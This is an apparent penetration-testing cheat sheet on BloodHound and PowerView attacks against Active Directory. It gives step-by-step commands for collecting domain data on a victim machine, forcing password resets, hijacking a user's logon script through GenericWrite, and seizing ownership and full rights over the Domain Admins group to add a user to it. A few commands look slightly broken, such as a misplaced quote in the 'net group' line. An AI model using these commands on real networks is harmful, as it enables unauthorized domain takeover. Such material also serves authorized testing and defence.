# BloodHound

> Discover paths to be domain admin.

> [!NOTE]  
> Mark user as owned > right click > mark.

## Installation

```shell
apt install neo4j bloodhound -y
neo4j console
bloodhound 2>/dev/null & disown
```

In the victim machine, import the module [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell
Import-Module .\SharpHound.ps1
```

Collect info

```powershell
Import-BloodHound -CollectionMethod All
```

## Outbound Control Rights

### First Degree Object Control

#### ForceChangePassword

If the user as this object, it can change the password from an user. Import the module [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
Import-Module .\PowerView.ps1
```

Force change of password

```powershell
Set-DomainUserPassword -Identity user -AccountPassword $SecPassword
```

#### GenericWrite

Import PowerView module

```powershell
Import-Module .\PowerView.ps1
```

Enumerate directory by a script autologon

```powershell
echo 'dir C:\Users\target\Desktop\ > C:\ProgramData\bh\output.txt' > test.ps1
```

Abuse object

```powershell
Set-DomainObject -Identity user -SET @{scriptpath='C:\ProgramData\bh\test.ps1'}
```

#### WriteOwner

```powershell
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity User
```

Grant all privileges

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity User
```

Add to the group Domain Admins

```powershell
net group "Domain Admins /add /domain"
```

Reconnect as the user
